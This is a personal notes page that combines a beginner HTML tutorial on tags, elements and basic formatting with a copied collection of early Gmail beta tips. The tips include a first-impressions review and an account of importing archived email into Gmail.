	    	    	2.1.1.2 HTML Elements
HTML documents are text files made up of HTML elements.

HTML elements are defined using HTML tags.
HTML Tags

    * HTML tags are used to mark-up HTML elements
    * HTML tags are surrounded by the two characters < and >
    * The surrounding characters are called angle brackets
    * HTML tags normally come in pairs like <b> and </b>
    * The first tag in a pair is the start tag, the second tag is the end tag
    * The text between the start and end tags is the element content
    * HTML tags are not case sensitive, <b> means the same as <B>

HTML Elements

Remember the HTML example from the previous page:

<html>
<head>
<title>Title of page</title>
</head>
<body>
This is my first homepage. <b>This text is bold</b>
</body>
</html>

This is an HTML element:

<b>This text is bold</b>

The HTML element starts with a start tag: <b>
The content of the HTML element is: This text is bold
The HTML element ends with an end tag: </b>

The purpose of the <b> tag is to define an HTML element that should be displayed as bold.

This is also an HTML element:

<body>
This is my first homepage. <b>This text is bold</b>
</body>

This HTML element starts with the start tag <body>, and ends with the end tag </body>.

The purpose of the <body> tag is to define the HTML element that contains the body of the HTML document.
Why do We Use Lowercase Tags?

We have just said that HTML tags are not case sensitive: <B> means the same as <b>. If you surf the Web, you will notice that plenty of web sites use uppercase HTML tags in their source code. We always use lowercase tags. Why?

If you want to follow the latest web standards, you should always use lowercase tags. The World Wide Web Consortium (W3C) recommends lowercase tags in their HTML 4 recommendation, and XHTML (the next generation HTML) demands lowercase tags.


	    	    	2.1.1.3 Basic HTML Tags
he most important tags in HTML are tags that define headings, paragraphs and line breaks.

The best way to learn HTML is to work with examples. We have created a very nice HTML editor for you. With this editor, you can edit the HTML source code if you like, and click on a test button to view the result.
Try it Yourself - Examples

A very simple HTML document
This example is a very simple HTML document, with only a minimum of HTML tags. It demonstrates how the text inside a body element is displayed in the browser. 

Simple paragraphs
This example demonstrates how the text inside paragraph elements is displayed in the browser.

(You can find more examples at the bottom of this page)
Headings

Headings are defined with the <h1> to <h6> tags. <h1> defines the largest heading. <h6> defines the smallest heading.

<h1>This is a heading</h1>
<h2>This is a heading</h2>
<h3>This is a heading</h3>
<h4>This is a heading</h4>
<h5>This is a heading</h5>
<h6>This is a heading</h6>

HTML automatically adds an extra blank line before and after a heading.
Paragraphs

Paragraphs are defined with the <p> tag.

<p>This is a paragraph</p>
<p>This is another paragraph</p>

HTML automatically adds an extra blank line before and after a paragraph.
Don't Forget the Closing Tag

You might have noticed that paragraphs can be written without end tags </p>:

<p>This is a paragraph
<p>This is another paragraph

The example above will work in most browsers, but don't rely on it. Future version of HTML will not allow you to skip ANY end tags.

Closing all HTML elements with an end tag is a future-proof way of writing HTML. It also makes the code easier to understand (read and browse) when you mark both where an element starts and where it ends.
Line Breaks

The <br> tag is used when you want to break a line, but don't want to start a new paragraph. The <br> tag forces a line break wherever you place it.

<p>This <br> is a para<br>graph with line breaks</p>

Try it yourself

The <br> tag is an empty tag. It has no end tag like </br>, since a closing tag doesn't make any sense.
<br> or <br />

More and more often you will see the <br> tag written like this: <br />

Because the <br> tag has no end tag (or closing tag), it breaks one of the rules for future HTML (the XML based XHTML), namely that all elements must be closed.

Writing it like <br /> is a future proof way of closing (or ending) the tag inside the opening tag, accepted by both HTML and XML.
Comments in HTML

The comment tag is used to insert a comment in the HTML source code. A comment will be ignored by the browser. You can use comments to explain your code, which can help you when you edit the source code at a later date.

<!-- This is a comment -->

Note that you need an exclamation point after the opening bracket, but not before the closing bracket.
Recap on HTML Elements

    * Each HTML element has an element name (body, h1, p, br)
    * The start tag is the name surrounded by angle brackets: <h1>
    * The end tag is a slash and the name surrounded by angle brackets </h1>
    * The element content occurs between the start tag and the end tag
    * Some HTML elements have no content
    * Some HTML elements have no end tag

Basic Notes - Useful Tips

When you write HTML text, you can never be sure how the text is displayed in another browser. Some people have large computer displays, some have small. The text will be reformatted every time the user resizes his window. Never try to format the text in your editor by adding empty lines and spaces to the text.

HTML will truncate the spaces in your text. Any number of spaces count as one. Some extra information: In HTML a new line counts as one space. 

Using empty paragraphs <p> to insert blank lines is a bad habit. Use the <br> tag instead. (But don't use the <br> tag to create lists. Wait until you have learned about HTML lists.)

HTML automatically adds an extra blank line before and after some elements, like before and after a paragraph, and before and after a heading.

We use a horizontal rule (the <hr> tag), to separate the sections in our tutorials.


	    	    	2.1.1.4

		2.1.2 Advanced

2. Web Browsers

3. Online APPs

4. EMAIL accounts

	4.1 Gmail

		4.1.1  GMAIL tips, http://g04.com/misc/GmailTipsComplete.html#Tip-05
Gmail Tips Table of Contents
Gmail Beta: First Impressions
How I 'Imported' archived email into Gmail
Gmail Tip #1: All About Labels
Gmail Tip #2: 'Check' Your Messages
Gmail Tip #3: How to Maintain 'Notes'
Gmail Tip #4: Formatting Your Name
Gmail Tip #5: The 'Plus' Side of Gmail
Gmail Tip #6: Define a Signature!
Gmail Tip #7: Quickly Addressing a Message
Gmail Tip #8: Working With Lots of Email
Gmail Tip #9: New Mail Notification!
Gmail Tip #10: Some Tips About Conversations
Gmail Tip #11: Connecting Securely
Gmail Tip #12: 'Archiving' Explained
Gmail Tip #13: Some More About Conversations
Gmail Tip #14: What Happens To Sent Messages?
Gmail Tip #15: New feature! Highlighting on/off!
Gmail Tip #16: New feature! View or Download for attached images
Gmail Tip #17: Advanced Search - View Multiple Labels
Gmail Tip #18: Some Forwarding Idiosyncracies
Gmail Tip #19: Advanced Search - 'Query Words'
Gmail Tip #20: Why some attachments bounce
Gmail Tip #21: 'Official' Features and Bugs Status Page
Gmail Tip #22: Advanced Search - Multi-Labeled and Un-Labeled Messages
Gmail Tip #23: Cleaning Your Contacts
Gmail Tip #24: New feature! Import Contacts
Gmail Tip #25: Find Your Unread Messages
Gmail Tip #26: Creating a Pseudo Address Group!
Gmail Tip #27: Adding Hotmail Contacts to Gmail
Gmail Tip #28: 'Gmail Notifier' released to beta!
Gmail Tip #29: A Small Quirk With Gmail Notify's 'mailto:' Handler
Gmail Tip #30: Removing a Label
Gmail Tip #31: Improved and New Contacts Features!
Gmail Tip #32: Drafts!
Gmail Tip #33: Auto-forward received Gmail!
Gmail Tip #34: Gmail on your Palm!
Gmail Tip #35: Gmail on your Palm! - Part 2
Gmail Tip #36: Some Email Management Tips
Gmail Tip #37: New Feature! Image Attachment Thumbnails
Gmail Tip #38: Google Gmail Minibrowser
Gmail Tip #39: New Feature! Gmail From Most Any Browser!
Gmail Tip #40: New Feature! Rich formatting!
Gmail Tip #41: How Much Space Do I Have?
Gmail Tip #42: A More Worldly View
Gmail Tip #43: Notes in Just Two Clicks!
Gmail Tip #44: Using An Email Client
Gmail Tip #45: Backing Up Your Gmail Account
Gmail Tip #46: Creating a Map Repository
Gmail Tip #47: Gmail Adds Chat!
Gmail Tip #48: Reply Without Scrolling
Gmail Tip #49: Moving the Chat Quick Contacts Box
Gmail Tip #50: Changing Subject Text When Replying or Forwarding
Gmail Tip #51: Keyboard Shortcuts
Gmail Tip #52: Can I "Delete all" Spam?
Gmail Tip #53: How Can I View Outlook Stationery In Gmail?
Gmail Tip #54: New Feature! Select ALL conversations
Gmail Tip #55: Excluding Chat from Search Results

Gmail Beta: First Impressions
The other day, I received an "invitation" to beta test Google's new "Gmail" email service. After having tried and used literally dozens of web-based email services over the years, I decided to see what the buzz was all about, so I followed the Invitation instructions, and within a couple minutes, I had a new Google Gmail account. After working with this account for several days, I have discovered some things that I like about it as well as some things that I don't. Read on for the lowdown...

First off, please note that this article is based on the pre-release beta of Gmail, so presumably, the public release will have additions, changes, and improvements. Also, I am using Internet Explorer to test this. Gmail supports most of the popular browsers, and even a few obscure ones, so if you use an alternate browser, be aware that your mileage may vary.

Webmail
While Web-based email is nothing new, Gmail introduces some new and unique concepts. Managing email has become very easy while at the same time having powerful tools to find and review information. I have used quite a number of email clients and web-based email accounts over the years. I have tried email accounts at Yahoo Mail, Hotmail, Onebox, ZipLip, FastMail, AOL, WebBox, and literally dozens more. Some are good, some are better, and some are plain junk. All the while, I have kept a "vanity" email account with NetIdentity (who uses "SecurePath" technology), and though I do pay for their account, their web-based email interface is very simplistic and the space is limited. So I continually look for "better" solutions.

But why use Webmail when I have a good client in Outlook? To me, a personal web-based email account is essential because I do not always have access to my home PC. Sure clients like Outlook are great, but if you can't access your PC, you simply can't easily access your email. Gmail on one hand is just another free email service, it really has the potential to become the next "killer app", because it has some innovations not found elsewhere. Gmail does, however, need some polishing in a number of areas before it's really "ready for primetime".

I'm going to first walk you through some of the "features" that make up Gmail. Some are typical, and some are unique. Then I'll detail some suggestions that, in my opinion, would make the service significantly better.

Advertising
Let's start off with the "tough" issue first: Advertising. This is probably the single most controversial aspect of Gmail. Opponents have said that Google's approach to inserting ads based on message content is a huge privacy breach. So much so that some legislators have proposed legislation to prevent Gmail from implementing this at all. OK, people, sit back and listen very closely as I step up onto my soapbox and explain "the truth"...

Gmail does not "read" your email. Gmail does not breach your privacy. Gmail does not care about your message content. All Gmail is doing is running your message through a "processor" that looks for ad-related keywords so that it can display unobtrusive targeted ads. Gmail's process of scanning your messages is technically no more intrusive than EVERY service like Yahoo Mail, Hotmail, and EVERY email service that offers virus scanning and spam protection. ALL of these services "scan" every word, every character, every phrase in your emails to determine if there is a virus present or if the message might be spam. Gmail's processing simply differs in that instead of matching message text against virus or spam pattens, it is matching against ad-related keyword lists. This is done at the session-level, so no data is retained.

Google has been extremely open and forthcoming about its privacy policy and process. The real issue is that for the first time, the general public is finally beginning to understand a concept that has been used and upon which they have been depending for years. Could this process be abused? Yes, it could, but so could ANY message scanning process. It really comes down to if you have faith in the integrity of the company. Google has a proven track record, and they would be committing corporate suicide if they were to breach that record. Yes, it could happen, but if you are really that paranoid about Gmail's processes, I suggest you not open a Gmail acocunt and look elsewhere.

Another important point about Gmail's ads is that they are VERY unobtrusive. They are much like the "Sponsored ads" you see on the right of a Google Search results screen. In fact, they don't even show up on every email message that you read, and so far, that's the only place you see the ads: when reading messages. They don't appear in any other screen. Gmail's ads are FAR less annoying than the flashy lights and huge billboards that services like Yahoo Mail and Hotmail use. And, given that the ads are intended to be targeted based on message content, you shouldn't see inapropriate or unrelated ads.

OK, I'll step down off of my soapbox now. Let's move on to the details of Gmail...

Logging In
Logging in is typical of webmail services. The login screen is clean and simply requires you to enter your username and password. Here is what the Login screen looks like:



Inbox
Once you successfully login, you are presented with your Inbox. Once again, it is pretty typical looking:



Messages are listed in a typical way, displaying the sender, subject, the first few words of the message body, and the date. Personally, I would like to see the message size included, but I can live without it. The checkbox lets you select individual messages on which to perform specific actions. The "star" lets you "flag" particular messages (more on this later.)

On the left are links that let you compose a message, and select different standard message groups (like Inbox, Sent mail, etc.) Again, it's one of the quick ways to find a specific message. Under the message groups is the "Labels" selector which I'll explain later.

Finally, there are links to all the other functions which I'll describe below.

Reading Messages
When you click on a message in the Inbox, the message opens for you to read or taks action. Here is what the message screen looks like:



Note a couple things: First, no external graphics are displayed. By default, Gmail disables displaying externally referenced graphics. The reason is that many spam messages contain externally referenced graphics. When they are displayed, the email sender can use this to track that you opened the message thus validating your email address for future spam. Clicking on the "Display External Images" link will display the images if you want. Here's an example of the above message with external images turned on:



You can reply to or forward a message by simply clicking on the appropriate link. This is standard functionality with one glaring problem: If the original email is HTML or Rich Text formatted, Gmail will strip out ALL formatting including links, fonts, and images. ie: you can only reply in plain text. To me, this is a HUGE problem because it means that a nice, formatted message gets "altered". My complaint is that if this is supposed to be marketed to the masses, they have grown to expect to be able to simply forward on what they received and expect it to arrive at its destination intact. I don't think this is an unreasonable request. In Gmail's defense, their support emails do say that they are planning on adding an HTML editor, so presumably, this may be resolved, but as of this beta, it isn't. Note that this is NOT exclusive to Gmail. Some other Webmail services do the same thing, but it's rare.

Starring a message
When you "star" a message, you can later click on the "Starred" link on the left of the Inbox screen and Gmail will display all messages that have been "starred". Your specific reason for "starring" a message is purely personal. It simply gives you yet another way to "group" messages.

Composing a Message
Composing a new email in Gmail is simple. At beta, it is a simple, plain text editor. Gmail support says they are planning on adding an HTML editor.

Here is what the Compose Messagescreen looks like:



You enter the email address, the subject, and the message body and click "Send". Pretty normal stuff. One nice feature is that if you have contacts set up, as you type the contact's name, a quick menu of contacts containing the letters you typed comes up. You can select one of the addresses quickly and simply. Very nice. There's also an integrated spelling checker. You can also attach files.

Contacts
Here is what the Contacts screen looks like:



Underwhelming, isn't it? Simply put, it's a contact list and nothing more. You maintain names, addresses, and a short note for the name. No phone entries, no addresses, bo birthdays, just names and email addresses. Streamlined to say the least. At present, there is no facility to import or export the contacts list, but Gmail support says that they are planning on adding it.

Some may view this as a weakness, bu don't forget that this isn't a corporate groupware product, this is a free webmail service.

Archiving
One of the first concepts that you have to get used to with Gmail is that of "Archiving". The overall power of Gmail is in its message management, searching and archival capabilities. In order to really leverage this, you need to get past the "I have to delete everything because I don't have enough storage space" mindset. With 1GB of storage, the average email user will have enough storage space to hold several years worth of emails. Yes, there will always be emails that you simply don't want to keep. Don't fret, despite some speculation, you can always delete any message you want. You aren't required to retain every email you ever received or sent.

OK, so what's Archiving? Archiving a message simply tells Gmail to remove the message from your Inbox screen and keep it in your "All Mail" screen. Simple enough, but what does this mean? When you receive an email, it first goes into your inbox. You can read it, reply to it, forward it, etc. You can apply a label to it (more on labels later), you can trash it, or you can report it as Spam. Pretty typical functions. All emails will remain in your inbox until you specifically "Archive" them. Archiving simply removes the message from your inbox screen.



But what happens to it? Don't worry, all messages are always accessible through the "All Mail" screen. Archiving simply cleans up your inbox. Once a message has been archived, should you ever want to, you can easily move it back to the inbox, but there really isn't a need for that.

Labels
The next concept that you have to wrap your mind around is that of the "Label". A Label is a way of classifying an email. It's similar to "folders" but it goes much farther: You can optionally assign a user-definable Label to any email. Then, when you click on a specific label in the label list on the left of the screen, Gmail displays only those emails under that label. Sounds a lot like folders, right?

The power of Labels shows in being able to assign multiple labels to an email. When you organize emails in folders, an email can reside in only one folder at a time. Say you have one folder called "Family" and another called "Jokes". Your brother sends you a joke email, so where do you put it--the Family folder or the Jokes folder? Gmail's Labels let you assign multiple labels to each email, so you could label your brother's joke email with both "Family" AND "Jokes" labels. Now, when you click the "Family" label in the label list, you see your brother's email along with all the other emails from family members. Likewise, when you click on the "Jokes" label, you also see your brother's joke email along with all of your other joke emails. At first, this may not seem too exciting, but after a while, you will see how this could be very powerful, especially with large numbers of accumulated emails.

Here is an example of the Labels screen:



I actually like labels, and I know I'll miss it in my other email account screens.

Searching
Searching is one of Gmail's unique features and strengths. Every email you have sent or received (that you have not sent to Trash) is searchable from the Search screen. Here is what the Search screen looks like:



As you can see, you can search on text in various fields. The fields aren't exclusive either--you can enter search text int multiple fields to narrow down the searches. In its current iteration, it seems pretty solid and useful. In fact, now that I've had a taste of Gmail's searching capabilities, I sorely miss it on my other email accounts. This should become standard fare on every webmail service.

The only thing I don't like about Gmail's implementation is that it doesn't provide for partial word searches. For example, if I want to find the email that had the City "Spokane" in it, but I don't know how to spell Spokane, I'm out of luck. I cannot enter "Spo" or "Spo*" or "*kane". Not a big issue, but some will complain.

Filters
Filtering is another useful feature. Filters are similar to Outlook's Rules. First you set up certain criteria similar to the Search function:



Then, you assign an action:



It's not fancy, but it is very useful to auto-label and archive certain emails. I read somewhere that you are limited to 20 filters. This may prove problematic for some.

Suggestions
Now that I have shown you what Gmail can do, here is a list of some suggestions that I feel will significantly improve the service. I forwarded this list to Gmail's "Feedback" page, so hopefully, they will consider some of them.

|   1. Fix the "Forward" function to forward the message UNALTERED. This may seem like an odd suggestion, but currently, if a message is in HTML or Rich Text format, Gmail strips all formatting, links, and images resulting in a simple, plain text message. Messages need to be retained as-is for a number of reasons. Maybe, this could be an option, but by default, ALL messages should be handled unaltered.
|   2. Add "Report as Spam" button to same line as the "Archive", "More Actions", "Refresh" line. Yes, I could click on the "More Actions" dropdown and select it from the list, but I would rather have an easy-to-find button.
|   3. Replace the "Compose Email" and "Refresh" links with buttons for consistency. Just a cosmetic thing. If you are going to utilize buttons for some functions, be consistent across the interface.
|   4. Add an "Import " function to bring emails into Gmail. Say that I have a lot of emails residing on another email account that I would like to have "transferred" to Gmail. Yes, I could "Forward" them all, but then they would appear to be "From" me. Instead, I would like to be able to "export" the emails from my current acount in .eml format, and then "import" them into Gmail seamlessly. Gmail should recognize them as "new" emails and apply all defined Filters.
|   5. Add an "Export" function to be able to copy emails out of Gmail providing users the ability to have "offline" storage and access. Yes, I could "Forward' them to another account, but it would be nice to have an online function that saved them all to .eml files and Zipped them all up for easy download.
|   6. Integrate the Search funciton into the above suggested Export function to allow selective exporting.
|   7. Add an "External Email" function to be able to pull in emails from other POP and IMAP accounts instead of having to forward those accounts to Gmail.
|   8. Allow for partial word searches.
|   9. Add "Import" and "Export" functions to Contacts. Managing hundreds of Contacts, requires this.
|  10. Add capability to "Label" Contacts (defined separately from the Message "labels".) Currently, contacts are simply a list. Being able to apply labels to Contacts would let us better view and manage them. Then, we could select just a Contact label for emailing and it should sent to all contacts with that label--kind of like a mailing list.
|  11. Have "Filters" optionally apply to ALL emails instead of just those selected or just new emails. Once we have hundreds or thousands of emails, being able to globally process emails may become essential.
|  12. Add an "Advanced Settings" option to allow "power users" to "tweak" more options such as edit box dimensions, screen colors, etc.
|  13. On the Settings screen, the entry "Maximum page size: Show XX conversations per page" has values of 25, 50, and 100. Add "20" to the list. This is large enough to show a good number of conversations, but small enough to prevent the user from having to grab the mouse to scroll down the page on a typical 1024x768 Windows XP screen.
|  14. Integrate Gmail notification into the Google Toolbar that would display the number of new messages in my Gmail Inbox. Clicking the button would then either launch the Gmail login screen, or if I could set my username and/or password in Toolbar "Settings", take me directly to my Gmail Inbox.
|  15. Provide an HTML editor to compose messages.
|  16. Allow Labels to be "nested" or "grouped" to allow for more granular labeling.
|  17. Optionally show a Size column in the Inbox listing and while reading a message. This should be togglable through Settings.


Final Thoughts
Gmail is at the same time unique and simple. It has some excellent features that are truely innovative, but at the same time, there isn't a lot of "depth" to many of the features. Unlike many popular webmail services, there is no caledering, no email list management, no extended contact information, and there are some pending functionality issues, but as a beta, it certainly has some teeth to it. Gmail's interface is very fast, primarily because it is NOT cluttered with the marketing glitz and images that clutter so many other webmail services.

If Gmail was generally available in its current state, I wouldn't recommend it for primetime, particularly for the "forwarding problam". But given that this is beta, Google seems to be responsive, and Google has always provided solid tools, I'll venture a guess that the final release will be an excellent service.

[top]	[return to GmailTips.com]

How I 'Imported' archived email into Gmail
I have a large number (about 1000) of archived emails that I have saved over the years, and I am looking for a way to "import" them into Gmail so that I can leverage Gmail's excellent Search and Label features. Over at the Gmail forum at Webmaster World is a posting on how to "import" emails into your Gmail account using Eudora. Well, I had some problems with Eudora, so I decided to use Outlook Express. Here's the message that I posted...

Well, I spent some time last night "importing" all of my archived emails into Gmail, and it really wasn't too bad. After several failed attempts with Eudora, I decided to go in a slightly different direction. The problems I was having with Eudora were two-fold:

|1. Gmail kept giving me that "Relay" error", so messages couldn't be delivered. (I COULD re-direct manually, on message at-a-time, but for some reason, using the Filter gave me the "Relay" error. Go figure.)

|2. I couldn't figure out how to import .eml files into Eudora. If anyone has any suggestions to these, I would be most greatful...

That said, I decided to use Outlook Express instead. It really worked like a charm, with two major idiosyncracies:

|1. OE uses whatever "Name" you set up in OE's account properties as the "From" instead of the original email address. This is a HUGE advantage of Eudora--it retains the original address when you re-direct. This means that in Gmail, that name is what you see in the From column. More on this later.

|2. OE uses the date you process as the email date, not the original email date, so that bit of data gets lost. I don't know how Eudora handles this, but I think it's the same as OE. To me, this was more of an annoyance than an issue.

End result? I now have almost 1100 emails in my Gmail account occupying 15MB (2%) of my space. The messages are now very easily searchable, labelable, and managable. Before I improted them into Gmail, there was simply no easy way to manage my old messages to find relevent information.

OK, so here's how I did it using Outlook Express (OE):

First, I opened OE and created an email account that pointed to my primary POP3 provider. In the "Name" field, instead of using my full name as normal, I used "Archived". This way, I can easily see that it's an archived email. Gmail will display this in its "From" column. I also set the "Leave messages on server" function checked for safety--didn't want to lose anything.

Next, I logged onto my Primary POP3 provider's webmail account and moved all emails from various folders into my Inbox. This way, OE would simply retrieve all emails. Yes, I just lost the organization I had to all these messages, but I'll take the time to use Gmail to quickly re-label them.

Next, I initiated a "Receive" in OE and retrieved all the emails from my POP3 provider. It retrieved about 650 emails.

I next went back to me Webmail account and moved all the messages into a "hold" folder clearing out my Inbox so that I wouldn't re-retrieve them.

Next, I opened Windows Explorer and opened the folder that contained 310 old ".eml" files that I had previously archived offline. I highlighted them all and then simply drag-and-dropped them into OE's Inbox. OE nicely imported them with all information (dates, original email addresses, etc.) intact. This simple task was something that I couldn't get Eudora to do. If someone knows how, PLEASE let me know!.

I now 960 emails in my OE Inbox.

Side note: I found out that my particular POP3 provider won't allow a "send" of more than 100 emails at-a-time, so I had to work with batches of 100 or less emails. So I created three folders in OE: "Hold", "Temp", and "Processed". These would be my work folders. I then moved all the emails from the Inbox into the "Hold" folder.

Next, I created a "Message Rule" in OE that would look for all messages whose subject line DIDN'T contain a unique string forward those messages. I chose the string "{[!ThisWillNeverMatchAnything!]}" and I chose the email address of "jim.barr+import@gmail.com".

I then moved batches of 100 emails from the Hold folder into the Temp folder, opened the message rule, and clicked "Apply Now", browsed to the Temp folder and clicked "Go". OE selected all the emails and began sending them. Once all were sent, I moved the emails in the Temp folder to the Processed folder. I then repeated this process for all emails. With 960 emails, this took some time.

OK, over to my Gmail account.... This resulted in 960 emails now in my Gmail Inbox view. All had a "From" address of "Archived", and the email date was last night's date. I next created a new Label called "Mail Archive" and did a Search on all emails that had a "From" of "Archived". This way, I wouldn't inadvertently select anything that might have come into my Inbox while I was "processing" all the "Archived" emails. I then proceeded to select "All", then applied the label "Mail Archive", and then selected "Archive" from Gmail's "More Actions" dropdown. This really was tedious, because for some reason, despite setting Gmail to display 100 conversations at-a-time, Gmail only displays 20 conversations at-a-time in the Search results view. Yes, I know, I could have set up a Filter prior to doing this to auto-label and archive the messages, but I forgot...

Anyway, I now have a very clean and virtually empty Inbox and a new Label with 960 "archived" messages. Over time, I'll simply apply additional Labels to the archived messages to better organize them. Yes, it'll take time, but Gmail makes it so easy...

Now, if I just can figure out how to get past Eudora's "Relay" issue as well as figuring out how to import ".eml" files, I wouldn't hesitate trashing all the messages I imported last night and re-doing it letting Eudora apply the proper "From" name. But for now, I'm very satisfied with the results.

[top]	[return to GmailTips.com]

Gmail Tip #1: All About Labels
Labels. Gmail lets you assign a Label to a message and then view all messages assigned to that Label. Sounds a lot like the typical "Folder", right? Well, almost. Unlike Folders, you can assign multiple Labels to a message letting the message span multiple categories. To better understand how Labels differ from Folders, counsider the the real-world counterparts, and it should become clear.

Say you have a desk full of paper messages, some messages are from family members, and some are jokes that your friends have sent you. Using the Folder model to categorize the messages, you would create one folder called "Family" and one called "Jokes". You would then look through the paper messages and file them accordingly. Simple and effortless. When you want to look for a message from your Father, you just look in the "Family" folder. But wait. One of the messages is from your Mother, AND it is a joke. Which folder do you file it in? That's the dilema with Folders.

OK, back to the desk full of paper messages. Now, instead of having folders, say you have sheets of labels, some marked "Family" and some marked "Jokes". You affix "Family" labels to all messages from your family, and you affix "Jokes" labels to all messages that are jokes. Your Mother's message simply now has two labels on it. When you want to see all Family messages, you just grab all the messages that have "Family" labels. Some may also have "Jokes" labels, but you don't care because you are interested in your Family messages. Likewise, when you grab all the messages labeled "Jokes", some may also have "Family" labels, but again, you don't care because you are looking at Jokes. Further, if you only want to look at jokes from your family, you grab only the messages with BOTH "Family" AND "Jokes" labels.

If you followed me this far, you should have absolutely no problem understanding Gmail's Label concept. Because Gmail lets you assign multiple labels to a message, your filing dilema is solved! Just put one or more Labels on a message, and finding it later becomes much easier.

You can add a Label to a message in one of two ways:

|1. If you are viewing a message listing, you can just click the checkbox next to the message, click on the "Apply label..." dropdown, and select the Label you want to apply. Gmail will display the Label just to the left of the message's Subject.

|2. If you are viewing a message, just click on the "Apply label..." dropdown, and select the label you want to apply. Gmail will display the new label to the right of the Subject line.

OK, you assigned a Label to a message, but at a later time, you want to remove it. How do you do that? Just select the Label view from the Labels box on the left, "select" the specific message by clicking the checkbox next to the message, and then click on the "Remove label 'xxxx'" button at the top of the listing. Your label has now been removed! Simple and intuitive. But where did the message go? It's no longer in the curernt view. If the message had one or more other Labels assigned, it will still show up in those Label views. If not, you will find it in the "All Mail" view.

Labels can be very useful and powerful once you break out of the Folder mindset.

[top]	[return to GmailTips.com]

Gmail Tip #2: 'Check' Your Messages
To leverage Gmail's excellent Label and Search functions, I imported close to 1000 archived emails into my Gmail account. (To see how I did it, click here.) After working this large number of messages for a few days, I have found that managing them, while typically easy and intuitive, it can sometimes be a bit cumbersome. Here is a tip to help you better manage your messages...

One neat feature of Gmail that may not be obvious at first is that Gmail "remembers" what emails you have "checked". This means, for example, that if you use Gmail's Search function to search for a message, if you "check" the message in the Search results view, when you then select a Label view or any other view that includes that email in its listing, the mesasge will be "pre-checked" for you! This makes tasks like removing Labels, trashing, etc. very easy. Not only is it "checked" but it is also highlighted in a different color making spotting it in a long list very easy.

[top]	[return to GmailTips.com]

Gmail Tip #3: How to Maintain 'Notes'
Some email providers provide a "Notes" function to let you maintain a list of notes. For example you might keep Web site links, random thoughts, etc. Gmail doesn't offer this feature, but by using some of Gmail's other features, you can set up a very nice, easy to maintain group of notes...

Basically, the concept is to email yourself the notes, but Gmail lets you at least better organize and handle these emails. Here's what you do:

First, create a Contact with a Name of "Notes" and an Email Address of "username+Notes@gmail.com"

Next, create a new Label called "Notes"

Finally, create a Filter to add the "Notes" Label any email addressed to "username+Notes@gmail.com". Also, check the "Skip the Inbox (Archive it)" checkbox.

The effect is this:

When you email yourself from an email account other than your own Gmail account, address the email to "username+Notes@gmail.com". When the message arrives in your Gmail account, it will automatically be archived into your "Notes" Label view, bypassing the Inbox. Nice and organized.

When you want to email yourself from your own Gmail account, click "Compose Email", and just type "Notes" in the "To" field and hit "Tab" or "Enter". Because you used the name "Notes" in the Contact, Gmail will fill in the email address automatically eliminating the need to enter a long address. Then, when you click send, the email gets sent to yourself, and is auto-archived in the Notes Label, just like above.

You now have a Label containing any notes you want to keep, and they are completely searchable!

[top]	[return to GmailTips.com]

Gmail Tip #4: Formatting Your Name
Gmail's account names (you know, the "left" side of your email address) are very forgiving. Read more for more details!

If you registered your Gmail account name like I did, you likely used the form "first.last@gmail.com". Did you know that it doesn't matter if you used a period or not! "john.doe@gmail.com" is treated the same as "johndoe@gmail.com". In fact, Gmail is not even case sensitive, so "JohnDoe@gmail.com" is the same as "joHn.doE@gmail.com"! So, not only did you get the email account name you wanted, but you really got more!

Any valid for also works at the login screen too! It surely makes remembering easier!

[top]	[return to GmailTips.com]

Gmail Tip #5: The 'Plus' Side of Gmail
Like many Email providers, Gmail supports the standard "plus" addressing scheme. But just what is it, and how can it help me?

The "plus" method of addressing lets you add additional words to your account name (the "left side" of your email address.) For example, if your email address is "john.doe@gmail.com", you could add "+club" when you give your email address to members of a club to which you belong. So, your email address would now be "john.doe+club@gmail.com". But why would you want to do this? Think of the "plus" word as an extra "keyword" or "tag" that you can use to better manage your messages.

Using our example, say you email an invitation to your friends in a club asking them to rsvp to the invitaion. You ask them to reply to "john.doe+nope@gtmail.com" when sending you a responseif they don't want to come, and reply to "john.doe+ofcourse@gmail.com". Assuming they follow your directions, You can then set up a Gmail Filters to automatically route emails to specific Labels based on the addresses. It's a simple example, but the uses can be numerous.

Another use is when you are shopping online. When asked for an email address, use something like "john.doe+amazon@gmail.com". That way, whenever you get future emails addressed to that address, you'll know that it's either from Amazon directly or from someone to whom they sold your email address. This can be a somewhat effctive way to track spam. Just be aware that not all email systems recognize or accept "plus" addresses. In fact, some spammers even strip it out completely, but it's a cool tool, none the less. THe best way is to just try it and see if it works for your application!

[top]	[return to GmailTips.com]

Gmail Tip #6: Define a Signature!
When Gmail was first released to Beta, it was missing the ability to create an automatically appended "Signature". Well, after beta tester feedback Gmail has added the feature! Read how to define it...

Go into "Settings" and click the radio button next to the edit box in the Signatire section. Next, enter any text you want to have included in all outgoing messages! Makes things simpler and more professional!

[top]	[return to GmailTips.com]

Gmail Tip #7: Quickly Addressing A Message
Want to know a quick way to address another Gmail user? Read more to find out!

Did you know that you can send an email to another Gmail user by just entering their username into either the TO, CC, or BCC fields when you Compose a message? You do not need to type the rest of the "@gmail.com" address! Simple end elegant!

[top]	[return to GmailTips.com]

Gmail Tip #8: Working With Lots Of Email

There are some idiosyncracies that you should understand when working with large numbers of messages. Read more for a couple pointers...

If you are working with a large number of emails, (more than will fit on one screen "page") be sure to remember that checking "All" doesn't check all messages in the category you are viewing, but only those visible on the current page. So, if you have three pages of messages, only the first page will be affected if you click "All".

[top]	[return to GmailTips.com]

Gmail Tip #9: New Mail Notification!
One often asked for feature has been some sort of automatic notification. Some suggestions ahve been integrating a button tn the Google Toolbar. Another was some sort of System Tray icon. Well, Gmail gave us a notification method that actually works very well...

Open your Gmail account and look at both the "Title" of your web browser as well as the "Button" in the Task Bar. It now shows something like "Gmail - Inbox (2)" where the "2" is the number of new emails you have. Because Gmail auto-updates periodically, this will update was well. Very cool! This works in IE, FireFox, Safari, and maybe others.

[top]	[return to GmailTips.com]

Gmail Tip #10: Some Tips about Conversations
Conversations are very handy. They group related emails letting you easily track what was sent and to whom it was sent.

One thing that you might overlook is that is that you need to remember that when you perform an action on a conversation such as "Print", "Move to Trash", or "Report as Spam", you are affecting ALL messages in the conversation. If you want to affect only one of the messages, select or expand the message and click on the "More options" link. This will bring up a sub-menu with options specific to that message.

One other thing to note is that Conversations are not perfect. By this, I mean that sometimes (but not always), if you have unrelated emails with the same subject, they sometimes get grouped together in the same conversation. Currently, there is no way to manually "ungroup" unrelated messages. Likewise, there is currently no way to manually "group" seemingly unrelated messages into a conversation.

[top]	[return to GmailTips.com]

Gmail Tip #11: Connecting Securely
Unlike many other Web-based email providers, Gmail offers an SSL-encrypted login by default. This means that your Gmail password is always encrypted when it is sent over the Internet.

